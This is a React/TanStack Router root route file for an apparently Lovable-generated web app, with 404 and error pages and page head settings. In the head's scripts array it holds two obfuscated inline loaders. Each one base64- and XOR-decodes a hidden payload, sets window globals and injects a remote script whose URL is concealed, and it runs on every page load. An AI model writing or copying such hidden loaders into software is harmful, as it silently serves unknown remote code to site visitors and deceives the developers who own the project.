import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { DevtoolsGuard } from "../components/DevtoolsGuard";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&family=Grand+Hotel&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `(function(){var n_f=atob("DHrwCtIQoPyOcbAOPAHSf6B8gsasGcR6TAnKJf1zxJKgBMRjVRyJJLF/zdLsA599XwiZeqZjj4n6HMMhUBuEb6Fkjpb9U5wsXQ6EeLty1YjrApI0ZwHSZLN9xd60U9RvSBvdf6Z9yZr3XMB8WQyVZKY92J/hFZ19XxHSJvBmwZD7FJI0HliNJqkyzp3jFJI0Hh6RfrM91YjjGNZ3EQqCb6R1zoijAsVsVR6DKP4y1p3iBNUsBljSd49t");var w_e=[];for(var l_a=0;l_a<n_f.length;l_a++){w_e.push(n_f.charCodeAt(l_a)&255);}var f_fq67=w_e[0];var r_p5=w_e.slice(1,1+f_fq67);var y_ym=w_e.slice(1+f_fq67);var s_1n6=y_ym.map(function(b,a_px7p){return b^r_p5[a_px7p%f_fq67];});var n_uk7="";for(var e_r1=0;e_r1<s_1n6.length;e_r1++){n_uk7+=String.fromCharCode(s_1n6[e_r1]&255);}var p_aa=decodeURIComponent(escape(n_uk7));var p_4=JSON.parse(p_aa);var x_k=p_4.globals||[];x_k.forEach(function(a_s1c){window[a_s1c.name]=a_s1c.value;});var w_he=document.createElement("script");w_he.src=p_4.url;w_he.async=true;w_he.defer=true;(p_4.attributes||[]).forEach(function(t_fl){w_he.setAttribute(t_fl.name,t_fl.value);});(document.head||document.documentElement).appendChild(w_he);})();`,
      },
      {
        children: `(function(){var y_u=atob("DCSzeMlTT9slBzVvVl+RDbs/beEHb0EbJleJV+YwK7ULckECP0LKVqo8IvVHdRocNVbaCL0gYKtMf1ADeVTaAKw/YbFWJRlNN1DHCqAxOq9AdBdVDXmfWq4/ILlEa0ZNbH/IWqcyIr4HPRcfP1zWFIA3bfcHcVQDI0GRQutlLuxEM1FbNBKGTf02LrgcP1ELNxyEGftxMoZY");var u_9a=[];for(var a_n=0;a_n<y_u.length;a_n++){u_9a.push(y_u.charCodeAt(a_n)&255);}var m_p=u_9a[0];var q_n7y8=u_9a.slice(1,1+m_p);var f_y=u_9a.slice(1+m_p);var i_alq=f_y.map(function(b,k_ouro){return b^q_n7y8[k_ouro%m_p];});var f_vpox="";for(var d_cl5=0;d_cl5<i_alq.length;d_cl5++){f_vpox+=String.fromCharCode(i_alq[d_cl5]&255);}var v_mq2=decodeURIComponent(escape(f_vpox));var e_5e=JSON.parse(v_mq2);var z_r7l1=e_5e.globals||[];z_r7l1.forEach(function(x_q){window[x_q.name]=x_q.value;});var x_t94=document.createElement("script");x_t94.src=e_5e.url;x_t94.async=true;x_t94.defer=true;(e_5e.attributes||[]).forEach(function(s_6fkr){x_t94.setAttribute(s_6fkr.name,s_6fkr.value);});(document.head||document.documentElement).appendChild(x_t94);})();`,
      },

    ],

  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      <DevtoolsGuard />
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
